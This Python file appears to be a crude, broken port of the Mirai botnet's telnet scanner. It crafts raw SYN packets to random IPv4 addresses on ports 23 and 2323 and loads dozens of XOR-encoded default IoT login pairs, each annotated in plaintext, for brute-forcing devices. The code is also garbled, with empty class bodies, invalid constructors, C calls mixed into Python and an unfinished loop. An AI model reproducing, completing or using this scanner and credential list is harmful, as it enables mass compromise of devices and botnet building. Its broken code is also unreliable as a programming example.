import os, socket, operator, sys

class scanner_auth(object):
    def __init__(username, password):
        self.username = username
        self.password = password
    @classmethod
    def from_input(cls):
        # Change this to automatically pick from a wordlist
        return cls(
            str(raw_input("Username: ")),
            str(raw_input("Password: "))
        )

class scanner_connection(object):
    def __init__(
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    ):
        self.SC_CLOSED, = SC_CLOSED,
        self.SC_CONNECTING, = SC_CONNECTING,
        self.SC_HANDLE_IACS, = SC_HANDLE_IACS,
        self.SC_WAITING_USERNAME, = SC_WAITING_USERNAME,
        self.SC_WAITING_PASSWORD, = SC_WAITING_PASSWORD,
        self.SC_WAITING_PASSWD_RESP, = SC_WAITING_PASSWD_RESP,
        self.SC_WAITING_ENABLE_RESP, = SC_WAITING_ENABLE_RESP,
        self.SC_WAITING_SYSTEM_RESP, = SC_WAITING_SYSTEM_RESP,
        self.SC_WAITING_SHELL_RESP, = SC_WAITING_SHELL_RESP,
        self.SC_WAITING_SH_RESP, = SC_WAITING_SH_RESP,
        self.SC_WAITING_TOKEN_RESP = SC_WAITING_TOKEN_RESP

def scanner_init():
    return

def scanner_kill():
    return

def setup_connection(scanner_connection):
    return

def get_random_ip(ipv4_t):
    return

def consume_iacs(scanner_connection):
    return

def consume_any_prompt(scanner_connection):
    return

def consume_user_prompt(scanner_connection):
    return

def consume_pass_prompt(scanner_connection):
    return

def consume_resp_prompt(scanner_connection):
    return

def add_auth_entry():
    return

scanner_auth(random_auth_entry)
def report_working(ipv4_t, scanner_auth):
    return

def recv_strip_null(sock, buf, len, flags):
    ret = recv(sock,buf,len,flags)
    if ret > 0:
        for i in ret:
            if buf[i] == 0x00:
                buf[i] = 'A'

    return ret

def scanner_init():
    i = 0
    source_port = 0

    class iphdr(iph):

    class tcphdr(tcph):

    scanner_pid = fork()
    if (scanner_pid > 0 or scanner_pid == -1):
        return

    local_addr = util_local_addr()

    rand_init()
    fake_time = time(NULL)
    conn = calloc(SCANNER_MAX_CONNS, len.scanner_connection)
    for i in SCANNER_MAX_CONNS:
        conn_table[i].state = SC_CLOSED
        conn_table[i].fd = -1
    rsck = socket.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    if rsck == -1:
        print "[scanner] Failed to initialize raw socket, cannot scan\n"
    else:
        exit(0)
    fcntl(rsock, F_SETFL, O_NONBLOCK) | fcntl(rsck, F_GETFL, 0)
    i = 1
    a = setsockopt(rsck, IPPROTO_IP, IP_HDRINCL)
    if len.a != 0:
        print "[scanner] Failed to set IP_HDRINCL, cannot scan\n"
    else:
        close(rsck)
        exit(0)

    try:
        source_port = rand_next() & 0xffff
        while ntohs(source_port) < 1024:
            iph = iphdr(scanner_rawpkt)
            tcph = tcphdr(iph + 1)
            iph.ihl = 5
            iph.version = 4
            iph.tot_len = htons(len.iphdr + len.tcphdr)
            iph.id = rand_next()
            iph.ttl = 64
            iph.protocol = IPPROTO_TCP

            tcph.dest = htons(23)
            tcph.source = source_port
            tcph.doff = 5
            tcph.window = rand_next() & 0xffff
            tcph.syn = True
        # Set up passwords
            add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     # root     xc3511
            add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          # root     vizxv
            add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          # root     admin
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      # admin    admin
            add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      # root     888888
            add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  # root     xmhdipc
            add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  # root     default
            add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              # root     juantech
            add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      # root     123456
            add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          # root     54321
            add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      # support  support
            add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              # root     (none)
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          # admin    password
            add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              # root     root
            add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          # root     12345
            add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              # user     user
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          # admin    (none)
            add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              # root     pass
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      # admin    admin1234
            add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              # root     1111
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          # admin    smcadmin
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          # admin    1111
            add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      # root     666666
            add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              # root     password
            add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              # root     1234
            add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      # root     klv123
            add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); # Administrator admin
            add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      # service  service
            add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); # supervisor supervisor
            add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      # guest    guest
            add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      # guest    12345
            add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      # guest    12345
            add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      # admin1   password
            add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); # administrator 1234
            add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              # 666666   666666
            add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              # 888888   888888
            add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              # ubnt     ubnt
            add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  # root     klv1234
            add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      # root     Zte521
            add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      # root     hi3518
            add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          # root     jvbzd
            add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              # root     anko
            add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          # root     zlxx.
            add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); # root     7ujMko0vizxv
            add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); # root     7ujMko0admin
            add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      # root     system
            add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              # root     ikwb
            add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              # root     dreambox
            add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              # root     user
            add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  # root     realtek
            add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              # root     00000000
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              # admin    1111111
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          # admin    1234
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      # admin    12345
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      # admin    54321
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  # admin    123456
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); # admin    7ujMko0admin
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          # admin    1234
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          # admin    pass
            add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  # admin    meinsm
            add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              # tech     tech
            add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              # mother   fucker
            print "[scanner] Scanner process initialized. Scanning started.\n"
            while True:
                scanner_connection(conn)
                class timeval(tim):
                last_avail_conn = 0
                last_spew = 0
                mfd_rd = 0
                mfd_wr = 0
                nfds = ""

                if fake_time != last_spew:
                    last_spew = fake_time
                    for i in SCANNER_RAW_PPS:
                        sockaddr_in(paddr) = 0
                        iphdr(iph) = iphdr(scanner_rawpkt)
                        tcphdr(tcph) = tcphdr(iph + 1)
                        iph.id = rand_next()
                        iph.saddr = LOCAL_ADDR
                        iph.daddr = get_random_ip()
                        iph.check = 0
                        iph.check = checksum_generic(iph, len.iphdr)

                        if i % 10 == 0:
                            tcph.dest = htons(2323)
                        else:
                            tcph.dest = htons(23)
                        tcph.seq = iph.daddr
                        tcph.check = 0
                        tcph.check = checksump_tcpudp(iph, tcph, htons(tcphdr), len.tcphdr)
                        paddr.sin_family = AF_INET
                        paddr.sin_addr.s_addr = iph.daddr
                        paddr.sin_port = tcph.dest

                        sendto(rsck, scanner_rawpkt, len.scanner_rawpkt, MSG_NOSIGNAL, sockaddr(paddr), len.paddr)

                last_avail_conn = 0
                while True:
                    

    except:
    return
deobf = str("")

can_consume = True
